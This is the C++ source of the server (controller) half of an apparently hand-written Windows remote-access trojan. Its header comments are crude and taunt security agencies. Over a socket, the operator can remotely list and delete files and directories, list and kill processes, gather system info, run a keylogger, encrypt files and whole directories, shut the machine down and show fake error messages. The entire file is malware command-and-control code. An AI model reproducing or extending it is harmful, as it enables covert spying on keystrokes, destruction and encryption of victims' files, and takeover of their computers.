/*
 * WARNING!
 * данное програмное обеспечение является полной собственностью автора
 * Copyright (2019-2020) by Nikait
 * не предназначено для тупых школьников
 * coded by govnocoder na poscale
 * FSB and FBR suck my dick bitch
 *
 * server part
*/

#include <winsock2.h>
#include <iostream>
#include <string>

#include "Menu.h"
#include "Config.h"


#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)


char buffer[100000];
std::string command, path, key;

int main() {
	PrintGreeting();
	
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0) {
		std::cout << "Error WSAStartup\n";
		exit(1);
	}

	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);

	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(PORT);
	addr.sin_family = AF_INET;
	
	SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL);

	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	listen(sListen, SOMAXCONN);
	std::cout << "[start] server " << IP << ":" << PORT << std::endl;
	
	SOCKET conn = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
	if (conn == 0) {
		std::cout << "Error accept\n";
		return -1;
	}
	else {
		std::cout << "Sucessful Connected!\ntype help to print HELP [MENU]\n";
		while (true) {
			memset(&buffer, 0x0, sizeof(buffer));
			std::cout << "command => ";
			std::getline(std::cin, command);

			if (command == "ls") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "rm") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "rmdir") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "sysinfo") {
				std::cout << "please, wait ...\n";
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "ps") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "kill") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter name => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "pwd") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}
			
			else if (command == "keylogger") {
				send(conn, "keylogger", sizeof("keylogger"), NULL);
				std::cout << "how many characters should record? => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "activate keylogger!\nwait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "cryptfile") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "path to file => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-25) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "cryptdir") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "path to directory => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-100) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "shutdown") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "ok\n";
			}

			else if (command == "error") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter name error => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "ok\n";
			}

			else if (command == "close") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "close connection";
				return 1;
			}

			else if (command == "help") {
				HelpMenu();
			}

			else std::cout << "command not found\n";
		}
	}
	return 0;
}